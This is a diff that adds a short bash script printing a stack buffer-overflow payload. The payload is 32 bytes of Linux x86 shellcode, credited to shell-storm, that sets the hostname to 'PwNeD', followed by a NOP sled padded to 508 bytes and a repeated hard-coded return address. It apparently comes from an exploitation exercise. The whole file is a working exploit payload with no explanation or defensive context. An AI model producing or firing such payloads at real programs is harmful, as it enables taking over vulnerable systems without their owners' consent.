@@ -1,0 +1,17 @@
+#!/bin/bash
+
+#http://shell-storm.org/shellcode/files/shellcode-622.php
+#32 bytes
+#set hostname PwNeD 
+
+echo -ne "\xeb\x11\x31\xc0\xb0\x4a\x5b\xb1\x08\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xea\xff\xff\xff\x50\x77\x4e\x65\x44\x20\x21\x21"
+
+for i in $(seq 33 508)
+do
+   echo -ne "\x90"
+done
+
+for i in 1 2
+do
+    echo -ne "\x1c\xd4\xff\xff"
+done
